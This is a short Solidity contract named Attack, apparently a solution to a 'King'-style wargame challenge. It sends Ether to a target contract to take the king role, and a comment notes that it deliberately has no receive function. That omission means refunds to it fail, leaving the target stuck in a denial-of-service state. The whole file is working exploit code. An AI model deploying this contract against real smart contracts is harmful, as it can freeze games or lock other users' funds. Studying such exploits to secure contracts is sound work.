// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;


contract Attack {
    // Having no receive function creates a DOS bug 
    constructor() payable public {
    }

    function becomeKing(address payable _to) public payable {
        (bool sent, bytes memory data) = _to.call{value: msg.value}("");
        require(sent, "Failed");
        
    }
}
